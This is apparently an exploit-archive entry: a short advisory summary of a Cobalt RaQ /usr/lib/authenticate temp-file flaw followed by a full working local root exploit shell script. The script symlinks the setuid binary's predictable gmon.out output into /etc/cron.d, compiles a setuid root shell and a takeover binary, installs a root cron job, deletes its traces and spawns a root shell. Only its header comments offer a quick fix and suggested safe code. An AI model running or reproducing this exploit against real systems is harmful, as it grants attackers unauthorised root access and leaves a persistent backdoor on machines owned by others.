@@ -1,0 +1,146 @@
+source: http://www.securityfocus.com/bid/5529/info
+
+A vulnerability has been reported in Cobalt RaQ that may allow attackers to obtain elevated privileges. The vulnerability exists in the /usr/lib/authenticate utility which is used by Apache for authentication purposes. Reportedly, the utility creates temporary files with predictable names with world-writeable permissions. This vulnerability is further exacerbated by the fact that /usr/lib/authenticate is a setuid root binary.
+
+
+#!/bin/sh
+#
+# Cobalt Linux 6.0 Local Root Exploit
+#
+# Effects: <= apache-1.3.20-RaQ4_1C3 (AFAIK all Cobalt Linux Apache ;)
+# Quick Fix: su - root -c "chmod 755 /usr/lib/authenticate"
+#
+# Problem Source Code:
+# fd = open("gmon.out", O_WRONLY|O_CREAT|O_TRUNC, 0666);
+#
+# Suggested Code:
+# fd = mkstemp("/tmp/gmon.out-XXXXXX");
+#
+# Still need help Cobalt developers? Ok:
+# man 3 tmpfile; man 2 open; echo "Thanks core"
+#
+# by Charles Stevenson <core@bokeoa.com>
+#
+# Fri Jun 28 03:35:53 MDT 2002
+# - initial version
+# Sun Jul 7 20:12:41 MDT 2002
+# - added some features for robustness
+
+echo "RaQFuCK.sh by core"
+
+target="/usr/lib/authenticate"
+tempdir="/tmp"
+
+if [ -u /.sushi ] ; then
+    exec /.sushi
+fi
+
+printf "Checking for $target..."
+if [ -f "$target" ] ; then
+    echo "done."
+else
+    echo "NO!"
+    exit 1
+fi
+
+printf "Checking if $target is setuid root..."
+if [ -u "$target" ] ; then
+    echo "done."
+else
+    echo "NO! Hrm... does this admin have a clue???"
+    exit 1
+fi
+
+if [ ! -d "$tempdir/core" ]; then
+    printf "Creating $tempdir/core..."
+    if ! mkdir "$tempdir/core" 2>/dev/null ; then
+	echo "FAILED!" ; exit 1
+    fi
+    echo "done."
+fi
+
+printf "Changing directory to $tempdir/core..."
+if ! cd "$tempdir/core" 2>/dev/null ; then
+    echo "FAILED!" ; exit 1
+else
+    echo "done."
+fi
+
+printf "Creating cron.d symlink..."
+if ! ln -fs /etc/cron.d/core gmon.out 2>/dev/null; then
+    echo "FAILED!" ; exit 1
+else
+    echo "done."
+fi
+
+printf "Changing umask..."
+if ! umask 000 ; then
+    echo "FAILED!" ; exit 1
+else
+    echo "done."
+fi
+
+printf "Compiling root shell..."
+cat >sushi.c <<EOF
+#include <unistd.h>
+int main (int argc, char **argv, char **envp) {
+    setuid(0);
+    setgid(0);
+    execve("/bin/sh",argv,envp);
+    return -1;
+}
+EOF
+if ! cc sushi.c -o sushi 2>/dev/null; then
+    echo "FAILED!" ; exit 1
+else
+    echo "done."
+fi
+
+printf "Compiling cron takeover..."
+cat >takeover.c <<EOF
+#include <stdlib.h>
+main() { system("cp $tempdir/core/sushi /.sushi ; chmod 6777 /.sushi"); }
+EOF
+if ! cc takeover.c -o own 2>/dev/null; then
+    echo "FAILED!" ; exit 1
+fi
+echo "done."
+
+printf "Performing symlink attack..."
+printf "\n\n\n\n" | "$target"
+if [ -u /etc/cron.d/core ] ; then
+    echo "SYMLINK ATTACK FAILED!" && exit 1
+else
+    echo "done."
+fi
+
+printf "Setting up evil cron job..."
+cat >croncore <<EOF
+*/1 * * * * root if [ -x "$tempdir/core/own" ] ; then "$tempdir/core/own";
+fi
+EOF
+if ! cat croncore 2>/dev/null >/etc/cron.d/core; then
+    echo "FAILED!" ; exit 1
+else
+    echo "done."
+fi
+
+printf "Waiting for root shell"
+while [ ! -u /.sushi ] ; do
+    sleep 1 ; printf "."
+done
+echo "done."
+
+cd /
+
+printf "Cleaning up real quick..."
+if ! /.sushi -c "rm -rf $tempdir/core /etc/cron.d/core"; then
+    echo "FAILED??? Fuck it!"
+else
+    echo "done."
+fi
+
+echo "Spawning root shell!!! God Damn! I say GOD DAMN!!"
+if ! exec /.sushi -i; then
+    echo "Exec Failed!!! BUMMER!" ; exit 1
+fi
